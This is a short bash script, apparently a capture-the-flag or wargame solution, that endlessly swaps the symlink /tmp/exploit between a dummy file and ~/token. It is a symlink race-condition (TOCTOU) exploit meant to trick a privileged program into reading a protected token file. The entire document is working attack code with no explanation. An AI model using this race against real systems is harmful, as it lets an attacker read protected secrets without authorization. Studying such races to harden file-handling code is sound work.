#!/bin/bash

while true;
do
	touch /tmp/lol;
	ln -fs /tmp/lol /tmp/exploit;
	ln -fs ~/token /tmp/exploit;
done
